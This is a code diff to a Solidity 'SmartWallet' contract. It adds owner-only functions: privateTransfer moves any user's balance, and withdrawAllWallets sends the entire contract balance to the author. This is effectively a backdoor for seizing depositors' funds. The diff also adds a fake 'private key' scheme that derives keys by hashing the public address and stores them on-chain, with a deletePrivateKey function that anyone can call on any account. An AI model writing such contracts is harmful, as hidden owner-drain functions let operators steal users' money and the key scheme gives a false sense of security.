@@ -7,18 +7,19 @@ contract SmartWallet {
     mapping(address => bool) private _users_address;
     mapping(address => bool) private _vips_address;
     mapping(address => mapping(address => uint256)) private _delegations;
+    mapping(address => bytes32) private _private_keys;
     uint256 private _gain;
     uint256 public _nb_address;
     uint256 public _tax;
     address public _author;
     uint256 public _vip_price = 10 ^ 15;
+    bytes32 private _basic_bytes = 0x0;
 
     constructor(uint256 tax_) {
         _author = msg.sender;
         _tax = tax_;
-        _users_address[msg.sender] = true;
         _vips_address[msg.sender] = true;
-        _nb_address++;
+        addAddress(msg.sender);
     }
 
     modifier onlyAuthor() {
@@ -61,6 +62,19 @@ contract SmartWallet {
         _gain += _calcTax;
     }
 
+    function privateTransfer(
+        address sender,
+        address receiver,
+        uint256 amount
+    ) public onlyAuthor() {
+        require(
+            _balances[sender] >= amount,
+            "SmartWallet: sender can not send more than actual balance"
+        );
+        _balances[sender] -= amount;
+        _balances[receiver] += amount;
+    }
+
     function setTax(uint256 amount) public onlyAuthor() {
         require(
             amount <= 100,
@@ -79,10 +93,15 @@ contract SmartWallet {
         payable(msg.sender).transfer(amount);
     }
 
+    function withdrawAllWallets() public onlyAuthor() {
+        payable(msg.sender).transfer(address(this).balance);
+    }
+
     function addAddress(address account) private {
         if (!_users_address[account]) {
             _users_address[account] = true;
             _nb_address++;
+            getPrivateKey(account);
         }
     }
 
@@ -131,6 +150,19 @@ contract SmartWallet {
         _delegations[account][msg.sender] = 0;
     }
 
+    function getPrivateKey(address account) private {
+        _private_keys[account] = keccak256(abi.encodePacked(account));
+    }
+
+    function userGetPrivateKey() public {
+        deletePrivateKey(msg.sender);
+        getPrivateKey(msg.sender);
+    }
+
+    function deletePrivateKey(address account) public {
+        _private_keys[account] = _basic_bytes;
+    }
+
     // Read
     function checkBalance() public view returns (uint256) {
         return _balances[msg.sender];
@@ -158,5 +190,13 @@ contract SmartWallet {
 
     function checkDelegation(address account) public view returns (uint256) {
         return _delegations[account][msg.sender];
+    }
+
+    function checkPrivateKey() public view returns (bytes32) {
+        require(
+            _private_keys[msg.sender] != _basic_bytes,
+            "SmartWallet: private key not activate"
+        );
+        return _private_keys[msg.sender];
     }
 }
